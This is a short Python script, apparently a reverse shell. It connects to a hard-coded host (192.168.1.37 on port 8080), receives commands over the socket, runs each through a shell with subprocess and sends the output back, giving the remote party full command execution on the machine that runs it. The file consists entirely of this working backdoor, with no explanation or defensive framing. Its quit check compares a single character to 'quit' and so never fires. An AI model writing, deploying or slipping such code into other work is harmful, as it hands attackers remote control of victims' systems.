import socket
import subprocess

class MySocket:
    def __init__(self,ip,port):

        self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.my_connection.connect((ip,port)) 
        print("Connection OK.")

    def command_exec(self,command):

        return subprocess.check_output(command,shell=True)

    
    def startlistener(self):
        while True:
            
                command_byte = self.my_connection.recv(1024)
                command = command_byte.decode("utf-8")
                if command[0] == "quit":
                    self.my_connection.close()
                    exit()
                command_output = self.command_exec(command)
                self.my_connection.send(command_output)
            

my_socket = MySocket("192.168.1.37",8080)
my_socket.startlistener()



